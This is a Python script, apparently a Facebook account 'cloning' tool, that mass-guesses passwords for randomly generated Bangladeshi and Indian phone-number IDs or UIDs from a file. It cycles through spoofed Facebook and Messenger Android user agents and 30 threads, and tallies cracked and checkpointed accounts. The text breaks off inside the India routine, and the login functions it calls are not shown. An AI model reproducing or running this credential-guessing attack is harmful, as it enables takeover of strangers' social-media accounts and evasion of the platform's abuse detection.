#-------------------------< IMPORT >--------------------------# 
import marshal, base64, zlib,bs4,sys,os
from os import path
import os,base64,zlib,pip,urllib
try:
        os.system('clear')
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from bs4 import BeautifulSoup as sop
        from bs4 import BeautifulSoup
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        os.system('pip install requests futures==2 > /dev/null')
except:pass
#-------------------------< COLOUR >--------------------------#
W='\x1b[1;97m';G='\x1b[38;5;48m';Y='\033[1;33m';B='\x1b[38;5;8m';P='\x1b[38;5;205m'
#-------------------------< LOOP >--------------------------#
user=[];ok=[];cp=[];twf=[];oks=[];cpx=[];cokix=[];plist=[];loop=0;pcp=[];id=[];tokenku=[]
#-------------------------< LINEX >--------------------------#
def clear():os.system('clear');print(logo)
def linex():print(f'{G}───────────────────────────────────────────────')
#-------------------------< FILE F3 & RANDOM R1/R4 UA >--------------------------#
def ___uaa___():
	fb_version=f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
	fb_version_code=str(random.randint(10000000, 66666666))
	application_version_code=str(random.randint(000000000,999999999))
	density=random.choice(['1.0', '1.5', '2.0', '2.5', '2.75', '2.8812501', '3.0'])
	width=random.choice(["720", "1080", "1280"])
	height=random.choice(["720", "1080", "1344", "1280", "1920","2131","2030","2110","2131","2056","2134","2168","2150","2170","2177","2110"])
	sim_name=random.choice(["Tele2You","Telenor","FASTWEB","Banglalink","Sprint","Jazz","Vodafone IN","Vi India","StarHub Mobile","MPT","TRUE-H","VIETTEL","inwi","Jio 4G","Chunghwa","airtel","GLOBE","TM","IND airtel","AIS","T-Mobile.pl","I TIM","MY MAXIS","MTS RUS","CellOne","TW Mobile","MegaFon","Tele2","TELE2","EE","vodafone IT","KYIVSTAR","Beeline KZ","activ"])
	country_code=random.choice(["cs_CZ","en_GB","en_US","lt_LT","pl_PL","id_ID","ru_RU","pt_PT","he_IL","hi_IN","nl_NL"," it_IT","en_IN","es_ES","en_PK"])
	mobile_version=f"{random.randint(4, 13)}.{random.randint(0, 5)}.{random.randint(1, 5)}"
	numbr = f'{random.randint(111111, 999999)}.{random.randint(111,999)}'
	build = random.choice(["SP1A.", "TP2A.", "SP1A.", "SP1A.", "TP1A.", "TP1A.", "SP1A.", "TP1A.", "RKQ1.", "TP1A.", "TP1A.", "RP1A.", "RP1A.", "RKQ1.", "TQ3A.", "TD2A.", "TD4A.", "TQ3A.", "TP1A.", "TP1A.", "SP2A.", "SD2A.", "SQ3A.", "RD2A.", "RQ3A.", "RP1A.", "QD4A.", "QQ3A.", "QP1A.", "PQ3B.", "PD2A.", "PPR2.", "PPR1.", "OPM8.", "OPR6."])
	mobile_model=random.choice(["A37f","1201","CPH1909","CPH1987","CPH1987","CPH1989","CPH1803","CPH1719","CPH1893","CPH1819","CPH1853","CPH1803","CPH1727","CPH1931","CPH1903","CPH1901","CPH1911","CPH2015","CPH1823","CPH1931","CPH1801","CPH1721","CPH1879","CPH2015","CPH1931","CPH1923","CPH2127","CPH2185","CPH1909","CPH2239","CPH2207","CPH2161","CPH2069","CPH2205","CPH2021","CPH2015","CPH2239","CPH2069","CPH2067"])
	#---------------------< ua system 1 >---------------------#
	end1=f"[FBAN/FB4A;FBAV/{str(fb_version)};FBBV/{str(fb_version_code)};FBDM/{{density={density},width={width},height={height}}};FBLC/{str(country_code)};FBRV/{str(application_version_code)};FBCR/{str(sim_name)};FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/{str(mobile_model)};FBSV/{str(mobile_version)};FBOP/1;FBCA/arm64-v8a:;]"
	ua1=f'Davik/2.1.0 (Linux; U; Android {str(mobile_version)}; '+str(mobile_model)+f' Build/{str(build)}{str(numbr)}) '+end1
	#---------------------< ua system 2 >---------------------#
	end2=f"[FBAN/FB4A;FBAV/{str(fb_version)};FBBV/{str(fb_version_code)};FBDM/{{density={density},width={width},height={height}}};FBLC/{str(country_code)};FBRV/{str(application_version_code)};FBCR/{str(sim_name)};FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/{str(mobile_model)};FBSV/{str(mobile_version)};FBOP/1;FBCA/arm64-v8a:;]"
	ua2=f'Davik/2.1.0 (Linux; U; Android {str(mobile_version)}; '+str(mobile_model)+f' Build/{str(build)}{str(numbr)}) '+end2
	#---------------------< ua system 3 >---------------------#
	end3=f"[FBAN/Orca-Android;FBAV/{str(fb_version)};FBPN/com.facebook.orca;FBLC/{str(country_code)};FBBV/{str(fb_version_code)};FBCR/{str(sim_name)};FBMF/OPPO;FBBD/OPPO;FBDV/{str(mobile_model)};FBSV/{str(mobile_version)};FBCA/arm64-v8a:null;FBDM/{{density={density},width={width},height={height}}};FB_FW/1;] FBBK/1"
	ua3=f'Davik/2.1.0 (Linux; U; Android {str(mobile_version)}; '+str(mobile_model)+f' Build/{str(build)}{str(numbr)}) '+end3
	#---------------------< ua system 4 >---------------------#
	end4=f"[FBAN/Orca-Android;FBAV/{str(fb_version)};FBPN/com.facebook.orca;FBLC/{str(country_code)};FBBV/{str(fb_version_code)};FBCR/{str(sim_name)};FBMF/OPPO;FBBD/OPPO;FBDV/{str(mobile_model)};FBSV/{str(mobile_version)};FBCA/arm64-v8a:null;FBDM/{{density={density},width={width},height={height}}};FB_FW/1;]"
	ua4=f'Davik/2.1.0 (Linux; U; Android {str(mobile_version)}; '+str(mobile_model)+f' Build/{str(build)}{str(numbr)}) '+end4
	#---------------------< ua system 5 >---------------------#
	ua5=f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+f';[FBAN/FB4A;FBAV/{str(fb_version)};FBBV/{str(fb_version_code)};FBDM/{{density={density},width={width},height={height}}};FBLC/{str(country_code)};FBRV/{str(application_version_code)};FBCR/{str(sim_name)};FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/{str(mobile_model)};FBSV/{str(mobile_version)};FBOP/1;FBCA/armeabi-v7a:armeabi;]'
	#---------------------< ua system 6 >---------------------#
	ua6=f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+f';[FBAN/FB4A;FBAV/{str(fb_version)};FBBV/{str(fb_version_code)};FBDM/{{density={density},width={width},height={height}}};FBLC/{str(country_code)};FBRV/{str(application_version_code)};FBCR/{str(sim_name)};FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/{str(mobile_model)};FBSV/{str(mobile_version)};FBOP/19;FBCA/armeabi-v7a:armeabi;]'
	return random.choice([ua1,ua2,ua3,ua4,ua5,ua6]) 
#-------------------------< FILE F2 UA>--------------------------#
def ___uaa1___():
	fb_version=f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
	fb_version_code=str(random.randint(10000000, 66666666))
	application_version_code=str(random.randint(000000000,999999999))
	density=random.choice(['1.0', '1.5', '2.0', '2.5', '3.0'])
	width=random.choice(["720", "1080", "1280"])
	height=random.choice(["720", "1080", "1280", "1440", "1920"])
	sim_name=random.choice(['Nepal_Telecom','Banglalink','Robi','Grameenphone','Airtel','BITEL','Movistar','TUNTEL','halebop','I TIM','Credit Mutuel','Claro','altice MEO','NOS','MEO','vodafone P','null','3','mt:s','entel','O2-CZ','O2 - UK','Vodafone UA','Our Telekom','EE','TelkomSA','TNT','vodafone IT','1 MOBILE','Cell C','giffgaff','Telekom.de','vodafone ES','3 AT','vodafone IE','ETISALAT','Iliad','orange','A1 BG','Syriatel','CoopVoce','iD','Kolbi ICE','1&amp-1','TIMBRASIL','WINDTRE','klarmobil','o2 - de+','Claro','O2.CZ','T-Mobile CZ','LIDL Connect','Bouygues Telecom','O2 Family'])
	country_code=random.choice(["en_US", "en_GB"])
	mobile_version=f"{random.randint(4, 13)}.{random.randint(0, 5)}.{random.randint(1, 5)}"
	build=random.choice(['SKQ1.210216.001','RKQ1.211103.002','SP1A.210812.016','TP1A.220905.001'])
	mobile_model=random.choice(["HUAWEI LUA-L21","HUAWEI TAG-L03","HUAWEI Y520-U33","HUAWEI Y336-U02","HUAWEI LYO-L21","ALE-L21","HUAWEI Y550-L01","HUAWEI Y360-U23","ALE-UL00","HUAWEI TAG-L03","HUAWEI G610-U15","HUAWEI CUN-U29","ALE-L21","HUAWEI CUN-L21","PRA-LX1","HUAWEI CUN-L01","HUAWEI TAG-L21","WAS-LX1A","EVA-L09","ALE-L21","VTR-L09","EVA-L09","ALE-L21","CAM-L21","RNE-L21","HUAWEI VNS-L31","WAS-LX1A","PRA-LX1","HUAWEI ATH-UL01","HUAWEI NXT-L09","AGS2-L09","HRY-LX1T","LDN-L21","HUAWEI LUA-L21","POT-LX1","MAR-LX1A","LLD-L31","HUAWEI VNS-L21","HUAWEI MT7-TL10","CLT-L09","DRA-LX2","VTR-L29","VIE-L09","POT-LX3","FIG-LX1","SNE-LX2","HRY-LX1","VTR-L09","JSN-L21","YAL-L21","PRA-LX1","HUAWEI VNS-L21","INE-LX1r","EVR-N29","FIG-LX1","FIG-LX2","VOG-L29","DRA-L01","MAR-LX2","WAS-LX1A","DUB-LX1","SNE-LX1","JKM-LX3","RNE-L21","ANE-LX1","ATU-L31","RNE-L21","CLT-L09","RNE-L21","YAL-L21"]) 
	#---------------------< ua system 1 >---------------------#
	end1=f"[FBAN/FB4A;FBAV/{str(fb_version)};FBBV/{str(fb_version_code)};FBDM/{{density={density},width={width},height={height}}};FBLC/{str(country_code)};FBCR/{str(sim_name)};FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/{str(mobile_model)};FBSV/{str(mobile_version)};FBOP/1;FBCA/armeabi-v7a:armeabi;]"
	ua1=f'Davik/2.1.0 (Linux; U; Android {str(mobile_version)}; '+str(mobile_model)+' Build/'+str(build)+') '+end1
	#---------------------< ua system 2 >---------------------#
	end2=f"[FBAN/FB4A;FBAV/{str(fb_version)};FBBV/{str(fb_version_code)};FBDM/{{density={density},width={width},height={height}}};FBLC/{str(country_code)};FBRV/{str(application_version_code)};FBCR/{str(sim_name)};FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/{str(mobile_model)};FBSV/{str(mobile_version)};FBOP/1;FBCA/arm64-v8a:;]"
	ua2=f'Davik/2.1.0 (Linux; U; Android {str(mobile_version)}; '+str(mobile_model)+' Build/'+str(build)+') '+end2
	#---------------------< ua system 3 >---------------------#
	end3=f"[FBAN/Orca-Android;FBAV/{str(fb_version)};FBPN/com.facebook.orca;FBLC/{str(country_code)};FBBV/{str(fb_version_code)};FBCR/{str(sim_name)};FBMF/HUAWEI;FBBD/HUAWEI;FBDV/{str(mobile_model)};FBSV/{str(mobile_version)};FBCA/arm64-v8a:null;FBDM/{{density={density},width={width},height={height}}};FB_FW/1;] FBBK/1"
	ua3=f'Davik/2.1.0 (Linux; U; Android {str(mobile_version)}; '+str(mobile_model)+' Build/'+str(build)+') '+end3
	#---------------------< ua system 4 >---------------------#
	end4=f"[FBAN/Orca-Android;FBAV/{str(fb_version)};FBPN/com.facebook.orca;FBLC/{str(country_code)};FBBV/{str(fb_version_code)};FBCR/{str(sim_name)};FBMF/HUAWEI;FBBD/HUAWEI;FBDV/{str(mobile_model)};FBSV/{str(mobile_version)};FBCA/arm64-v8a:null;FBDM/{{density={density},width={width},height={height}}};FB_FW/1;]"
	ua4=f'Davik/2.1.0 (Linux; U; Android {str(mobile_version)}; '+str(mobile_model)+' Build/'+str(build)+') '+end4
	#---------------------< ua system 5 >---------------------#
	ua5=f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+f';[FBAN/FB4A;FBAV/{str(fb_version)};FBBV/{str(fb_version_code)};FBDM/{{density={density},width={width},height={height}}};FBLC/{str(country_code)};FBRV/{str(application_version_code)};FBCR/{str(sim_name)};FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/{str(mobile_model)};FBSV/{str(mobile_version)};FBOP/1;FBCA/armeabi-v7a:armeabi;]'
	#---------------------< ua system 6 >---------------------#
	ua6=f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+f';[FBAN/FB4A;FBAV/{str(fb_version)};FBBV/{str(fb_version_code)};FBDM/{{density={density},width={width},height={height}}};FBLC/{str(country_code)};FBRV/{str(application_version_code)};FBCR/{str(sim_name)};FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/{str(mobile_model)};FBSV/{str(mobile_version)};FBOP/19;FBCA/armeabi-v7a:armeabi;]'
	return random.choice([ua1,ua2,ua3,ua4,ua5,ua6])
#-------------------------< RANDOM R2 UA >--------------------------#
def ___filef2x___():
	fb_version=f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
	fb_version_code=str(random.randint(10000000, 66666666))
	application_version_code=str(random.randint(000000000,999999999))
	density=random.choice(['1.0', '1.5', '2.0', '2.5', '2.75', '2.8812501', '3.0'])
	width=random.choice(["720", "1080", "1280"])
	height=random.choice(["720", "1080", "1344", "1280", "1920","2131","2030","2110","2131","2056","2134","2168","2150","2170","2177","2110"])
	sim_name=random.choice(["Tele2You","Telenor","FASTWEB","Banglalink","Sprint","Jazz","Vodafone IN","Vi India","Tele2 LT","Jio 4G","EE","Oi","MtelBG","AT&amp-T","Ufone","Azercell","T-Mobile.pl","TELCEL","Vodafone","altice MEO","MOCHE","Idea - Be Safe","KYIVSTAR","ALGAR TELECOM","KYIVSTAR","GOLAN T","Claro BR","TIM","T-Mobile","CoopVoce","BSNL Mobile","MTS RUS","Oskarta","Beeline","Partner"])
	country_code=random.choice(["cs_CZ","en_GB","en_US","lt_LT","pl_PL","id_ID","ru_RU","pt_PT","he_IL","hi_IN","nl_NL"," it_IT","en_IN","es_ES","en_PK"])
	mobile_version=f"{random.randint(4, 13)}.{random.randint(0, 5)}.{random.randint(1, 5)}"
	numbr = f'{random.randint(111111, 999999)}.{random.randint(111,999)}'
	build = random.choice(["SP1A.", "TP2A.", "SP1A.", "SP1A.", "TP1A.", "TP1A.", "SP1A.", "TP1A.", "RKQ1.", "TP1A.", "TP1A.", "RP1A.", "RP1A.", "RKQ1.", "TQ3A.", "TD2A.", "TD4A.", "TQ3A.", "TP1A.", "TP1A.", "SP2A.", "SD2A.", "SQ3A.", "RD2A.", "RQ3A.", "RP1A.", "QD4A.", "QQ3A.", "QP1A.", "PQ3B.", "PD2A.", "PPR2.", "PPR1.", "OPM8.", "OPR6."])
	mobile_model=random.choice(["GT-I9195","SM-T530","SM-J200F","SPH-L710T","SM-G313ML","SM-J200G","GT-I9060I","SM-G316M","SM-G531H","SM-G900F","SM-G530H","SM-T210R","SM-J320M","SM-J120H","SM-J110H","SM-G532M", "SM-G925F","GT-I9195","SM-G531H","SM-G3502T","SGH-T599N","SM-G900F","SM-J111M","SAMSUNG-SM-G530AZ","SM-G530FZ","GT-I9301I"," SM-G531M", "SM-G318ML"])
	#---------------------< ua system 1 >---------------------#
	end1=f"[FBAN/FB4A;FBAV/{str(fb_version)};FBBV/{str(fb_version_code)};FBDM/{{density={density},width={width},height={height}}};FBLC/{str(country_code)};FBRV/{str(application_version_code)};FBCR/{str(sim_name)};FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{str(mobile_model)};FBSV/{str(mobile_version)};FBOP/1;FBCA/arm64-v8a:;]"
	ua1=f'Davik/2.1.0 (Linux; U; Android {str(mobile_version)}; '+str(mobile_model)+f' Build/{str(build)}{str(numbr)}) '+end1
	#---------------------< ua system 2 >---------------------#
	end2=f"[FBAN/FB4A;FBAV/{str(fb_version)};FBBV/{str(fb_version_code)};FBDM/{{density={density},width={width},height={height}}};FBLC/{str(country_code)};FBRV/{str(application_version_code)};FBCR/{str(sim_name)};FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{str(mobile_model)};FBSV/{str(mobile_version)};FBOP/1;FBCA/arm64-v8a:;]"
	ua2=f'Davik/2.1.0 (Linux; U; Android {str(mobile_version)}; '+str(mobile_model)+f' Build/{str(build)}{str(numbr)}) '+end2
	#---------------------< ua system 3 >---------------------#
	end3=f"[FBAN/Orca-Android;FBAV/{str(fb_version)};FBPN/com.facebook.orca;FBLC/{str(country_code)};FBBV/{str(fb_version_code)};FBCR/{str(sim_name)};FBMF/samsung;FBBD/samsung;FBDV/{str(mobile_model)};FBSV/{str(mobile_version)};FBCA/arm64-v8a:null;FBDM/{{density={density},width={width},height={height}}};FB_FW/1;] FBBK/1"
	ua3=f'Davik/2.1.0 (Linux; U; Android {str(mobile_version)}; '+str(mobile_model)+f' Build/{str(build)}{str(numbr)}) '+end3
	#---------------------< ua system 4 >---------------------#
	end4=f"[FBAN/Orca-Android;FBAV/{str(fb_version)};FBPN/com.facebook.orca;FBLC/{str(country_code)};FBBV/{str(fb_version_code)};FBCR/{str(sim_name)};FBMF/samsung;FBBD/samsung;FBDV/{str(mobile_model)};FBSV/{str(mobile_version)};FBCA/arm64-v8a:null;FBDM/{{density={density},width={width},height={height}}};FB_FW/1;]"
	ua4=f'Davik/2.1.0 (Linux; U; Android {str(mobile_version)}; '+str(mobile_model)+f' Build/{str(build)}{str(numbr)}) '+end4
	#---------------------< ua system 5 >---------------------#
	ua5=f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+f';[FBAN/FB4A;FBAV/{str(fb_version)};FBBV/{str(fb_version_code)};FBDM/{{density={density},width={width},height={height}}};FBLC/{str(country_code)};FBRV/{str(application_version_code)};FBCR/{str(sim_name)};FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{str(mobile_model)};FBSV/{str(mobile_version)};FBOP/1;FBCA/armeabi-v7a:armeabi;]'
	#---------------------< ua system 6 >---------------------#
	ua6=f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+f';[FBAN/FB4A;FBAV/{str(fb_version)};FBBV/{str(fb_version_code)};FBDM/{{density={density},width={width},height={height}}};FBLC/{str(country_code)};FBRV/{str(application_version_code)};FBCR/{str(sim_name)};FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{str(mobile_model)};FBSV/{str(mobile_version)};FBOP/19;FBCA/armeabi-v7a:armeabi;]'
	return random.choice([ua1,ua2,ua3,ua4,ua5,ua6])
#-------------------------< RANDOM R4 UA >--------------------------#
def uax():
	fb_version=f"{str(random.randint(75,117))}.0.{str(random.randint(2500,5900))}.{str(random.randint(80,200))}"
	mobile_version=f"{random.randint(4, 13)}.{random.randint(0, 5)}.{random.randint(1, 5)}"
	mobile_model=random.choice(["SM-A515F","SM-A405FN","SM-A205U","SM-A105FN","SM-A515F","SM-A720F","SM-A515F","SM-G930F","SM-G980F","SM-A750FN","SM-A515F","SM-A515F","SM-A750FN","SM-G950F","SM-A515F","SM-G980F","SM-A515F","SM A022M","SM-A515F","SM-G970F","SM-A415F","SM-A217F","SM-G975F","SM-G965F","SM-A505FN","SM-A515F","SM-J700M","SM-A217F","SM-J737P","SM-A515F","SM-G998B","SM-A705FN","SM-A725F","SM-A715F","SM-A505FN","SM-A515F","SM-A750FN","SM-A528B","SM-G780G","SM-A505FN","SM-A325F","SM-A515F","SM-A015M","SM-A326W","SM-N950F","SM-A426U","SM-G9960","SM-A226B","SM-G988U1","SM-A405FN","SM-A125U","SM-G9750","SM-A217F","SM-S260DL","SM-A125U","SM-G981U","SM-G781U1","SM-A515F","SM-A125F","SM-A9200","SM-G9880","SM-N960U","SM-G998B","SM-A515F","SM-J530FM","SM-A515F","SM-S205DL","SM-N770F","SM-G985F","SM-N980F","SM-A125F","SM-A528B","SM-G986U","SM-G950F","SM-G970U","SM-J600G","SM-N981U","SM-A515U","SM-A125F","SM-G981V","SM-N960U","SM-A525F","SM-A127F","SM-A025U","SM-F926U","SM-A600FN","SM-G955F","SM-G981U","SM-J737T1","SM-A105M","SM-G970U","SM-A516B","SM-A326U","SM-G988U","SM-A202F","SM-T900","SM-G610M","SM-G985F","SM-N986U","SM-A805F"])
	build=random.choice(['SKQ1.210216.001','RKQ1.211103.002','SP1A.210812.016','TP1A.220905.001'])
	ua1=f"Mozilla/5.0 (Linux; Android {mobile_version}; {mobile_model} Build/{build}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{fb_version} Mobile Safari/537.36"
	ua2=f'Mozilla/5.0 (Linux; U; Android {mobile_version}; {mobile_model} Build/{build}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{fb_version} Mobile Safari/537.36 OPR/62.4.2254.61190|"Not:A-Brand";v="99", "Chromium";v="98"|11|98.0.4758.101'
	ua3=f"Mozilla/5.0 (Linux; U; Android {mobile_version}; {mobile_model} Build/{build}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{fb_version} Mobile Safari/537.36 HeyTapBrowser/{str(random.randint(6,47))}.{str(random.randint(7,8))}.{str(random.randint(2,40))}.{str(random.randint(1,9))}"
	return random.choice([ua1,ua2,ua3])
#-------------------------< LOGO >--------------------------#
logo=(f'''
\x1b[38;5;48md8888b.  .d8b.  d8b   db .d8888.  .d88b.  d8b   db 
\x1b[38;5;48m88  `8D d8' `8b 888o  88 88'  YP .8P  Y8. 888o  88 
\x1b[38;5;48m88oooY' 88ooo88 88V8o 88 `8bo.   88    88 88V8o 88 
\x1b[38;5;48m88~~~b. 88~~~88 88 V8o88   `Y8b. 88    88 88 V8o88 
\x1b[38;5;48m88   8D 88   88 88  V888 db   8D `8b  d8' 88  V888 
\x1b[38;5;48mY8888P' YP   YP VP   V8P `8888Y'  `Y88P'  VP   V8P  V/ 0.1                                                                                                      
{G}───────────────────────────────────────────────\n{B}|{G}×{B}|{W} Owner    SHAKIL HOSSAIN SHANTO\n{B}|{G}×{B}|{W} Tools   > File × Random\n{G}───────────────────────────────────────────────''')
#-------------------------< MENU >--------------------------#
def ____menu____():
	clear()
	print(f"{B}|{G}1{B}|{W} File Cloning");print(f"{B}|{G}2{B}|{W} Random Cloning");print(f"{B}|{G}0{B}|{W} Exit Cloning");linex();option=input(f"{B}|{G}?{B}|{W} Select > ")
	if option in ["1"]:____filex____()
	if option in ["2"]: ____randm____()
	else:exit()
#-------------------------< RANDOM >--------------------------#
def ____randm____():
	clear()
	print(f"{B}|{G}1{B}|{W} Bangladesh Cloning {B}|{G}A{B}|{W} ");print(f"{B}|{G}2{B}|{W} Bangladesh Cloning {B}|{G}B{B}|{W} ");print(f"{B}|{G}3{B}|{W} India Cloning");print(f"{B}|{G}0{B}|{W} Exit Cloning");linex();option=input(f"{B}|{G}?{B}|{W} Select ━➤ ")
	if option in ["1","A"]:____bangladesha____()
	if option in ["2","B"]:____bangladeshb____()
	if option in ["3"]: ____india____()
	else:exit()
#-------------------------< FILE >--------------------------#
def ____filex____():
	clear()
	print(f"{B}|{G}×{B}|{W} Example ━➤ /sdcard/CRAZY-XD");linex();file=input(f"{B}|{G}?{B}|{W} Select  ━➤ ")
	try:
		fo = open(file,'r').read().splitlines()
	except FileNotFoundError:
		print(f"{B}|{G}×{B}|{W} File Not Found ");time.sleep(1);exit()
	clear();print(f"{B}|{G}1{B}|{W} Method ━➤ F1");print(f"{B}|{G}2{B}|{W} Method ━➤ S2");print(f"{B}|{G}3{B}|{W} Method ━➤ F3");print(f"{B}|{G}4{B}|{W} Method ━➤ F4");linex();methd=input(f"{B}|{G}?{B}|{W} Select ━➤ ")
	clear()
	plist = []
	try:
		ps_limit = int(input(f'{B}|{G}×{B}|{W} Password Limit ━➤ '))
	except:
		 ps_limit =1
	clear();print(f"{B}|{G}×{B}|{W} Example ━➤ firstlast | first123 ");linex()
	for i in range(ps_limit):
		plist.append(input(f'{B}|{G}×{B}|{W} Password No{i+1} ━➤{G} '))
	clear();print(f"{B}|{G}×{B}|{W} Cp Uid Show |y|n| ");linex();cpxs=input(f"{B}|{G}?{B}|{W} Select ━➤ ")
	if cpxs in ['y','Y','yes','Yes','1']:pcp.append('y')
	else:pcp.append('n')
	with tred(max_workers=30) as heyCRAZYx:
		clear();total_ids = str(len(fo))
		print(f"{B}|{G}×{B}|{W} Total Uid ━➤{G} {total_ids}");linex()
		for user in fo:
			ids,names = user.split('|')
			passlist = plist
			if methd in ['1','A']:heyCRAZYx.submit(____M1____,ids,names,passlist)
			if methd in ['2','B']:heyCRAZYx.submit(____M2____,ids,names,passlist)
			if methd in ['3','C']:heyCRAZYx.submit(____M3____,ids,names,passlist)
			if methd in ['4','D']:heyCRAZYx.submit(____M4____,ids,names,passlist)
	print("");linex();print(f'{B}|{G}×{B}|{W} The Cracking Has Been Complete...');print(f'{B}|{G}×{B}|{W} Total Ok Uid ━➤ {str(len(ok))}');print(f'{B}|{G}×{B}|{W} Total Cp Uid ━➤ {str(len(cp))}');linex();exit()
#-------------------------< BANGLADESH 1 >--------------------------#
def ____bangladesha____():
	clear()
	print(f"{B}|{G}×{B}|{W} Example ━➤ 01728 | 01978 | 01610 | 01834 | 01330 ");linex();code=input(f"{B}|{G}?{B}|{W} Select  ━➤ ");clear();print(f"{B}|{G}1{B}|{W} Method ━➤ R1");print(f"{B}|{G}2{B}|{W} Method ━➤ R2");print(f"{B}|{G}3{B}|{W} Method ━➤ R3");print(f"{B}|{G}4{B}|{W} Method ━➤ R4");print(f"{B}|{G}5{B}|{W} Method ━➤ R5");linex();methd=input(f"{B}|{G}?{B}|{W} Select ━➤ ")
	limit = str(random.randint(30000,70000))
	for nmbr in range(int(limit)):
		nmp = ''.join(random.choice(string.digits) for _ in range(6))
		user.append(nmp)
	with tred(max_workers=30) as CRAZYx:
		clear();tl = str(len(user))
		print(f"{B}|{G}×{B}|{W} Sim Code  ━➤{G} {code} {B}|{G}×{B}|{W} Total Uid ━➤{G} {tl}");linex()
		for love in user:
			ids = code+love
			pasx = [ids,love,ids[:7],ids[:6],ids[:8]]
			if methd in ['1']:CRAZYx.submit(__M1__,ids,pasx,tl)
			if methd in ['2']:CRAZYx.submit(__M2__,ids,pasx,tl)
			if methd in ['3']:CRAZYx.submit(__M3__,ids,pasx,tl)
			if methd in ['4']:CRAZYx.submit(__M4__,ids,pasx,tl)
			if methd in ['5']:CRAZYx.submit(__M5__,ids,pasx,tl)
	print("");linex();print(f'{B}|{G}×{B}|{W} The Cracking Has Been Complete...');print(f'{B}|{G}×{B}|{W} Total Ok Uid ━➤ {str(len(ok))}');print(f'{B}|{G}×{B}|{W} Total Cp Uid ━➤ {str(len(cp))}');linex();exit()
#-------------------------< BANGLADESH 2 >--------------------------#
def ____bangladeshb____():
	clear()
	print(f"{B}|{G}×{B}|{W} Example ━➤ 017 | 019 | 016 | 018 | 013 ");linex();code=input(f"{B}|{G}?{B}|{W} Select  ━➤ ");clear();print(f"{B}|{G}1{B}|{W} Method ━➤ R1");print(f"{B}|{G}2{B}|{W} Method ━➤ R2");print(f"{B}|{G}3{B}|{W} Method ━➤ R3");print(f"{B}|{G}4{B}|{W} Method ━➤ R4");print(f"{B}|{G}5{B}|{W} Method ━➤ R5");linex();methd=input(f"{B}|{G}?{B}|{W} Select ━➤ ")
	limit = str(random.randint(30000,70000))
	for nmbr in range(int(limit)):
		koda = ''.join(random.choice(string.digits) for _ in range(2))
		kodb = ''.join(random.choice(string.digits) for _ in range(2))
		nmp = ''.join(random.choice(string.digits) for _ in range(4))
		user.append(nmp)
	with tred(max_workers=30) as CRAZYx:
		clear();tl = str(len(user))
		print(f"{B}|{G}×{B}|{W} Sim Code  ━➤{G} {code} {B}|{G}×{B}|{W} Total Uid ━➤{G} {tl}");linex()
		for love in user:
			ids = code+koda+kodb+love
			pasx = [koda+kodb+love,kodb+love,code+koda+kodb,code+code,'১২৩৪৫৬']
			if methd in ['1']:CRAZYx.submit(__M1__,ids,pasx,tl)
			if methd in ['2']:CRAZYx.submit(__M2__,ids,pasx,tl)
			if methd in ['3']:CRAZYx.submit(__M3__,ids,pasx,tl)
			if methd in ['4']:CRAZYx.submit(__M4__,ids,pasx,tl)
			if methd in ['5']:CRAZYx.submit(__M5__,ids,pasx,tl)
	print("");linex();print(f'{B}|{G}×{B}|{W} The Cracking Has Been Complete...');print(f'{B}|{G}×{B}|{W} Total Ok Uid ━➤ {str(len(ok))}');print(f'{B}|{G}×{B}|{W} Total Cp Uid ━➤ {str(len(cp))}');linex();exit()
#-------------------------< INDIA >--------------------------#
def ____india____():
	clear()
	print(f"{B}|{G}×{B}|{W} Example ━➤ +91620 | +91639 | +91934 ");linex();code=input(f"{B}|{G}?{B}|{W} Select  ━➤ ");clear();print(f"{B}|{G}1{B}|{W} Method ━➤ R1");print(f"{B}|{G}2{B}|{W} Method ━➤ R2");print(f"{B}|{G}3{B}|{W} Method ━➤ R3");print(f"{B}|{G}4{B}|{W} Method ━➤ R4");print(f"{B}|{G}5{B}|{W} Method ━➤ R5");linex();methd=input(f"{B}|{G}?{B}|{W} Select ━➤ ")
	limit = str(random.randint(30000,70000))
	for nmbr in range(int(limit)):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	with tred(max_workers=30) as CRAZYx:
		clear();tl = str(len(user))
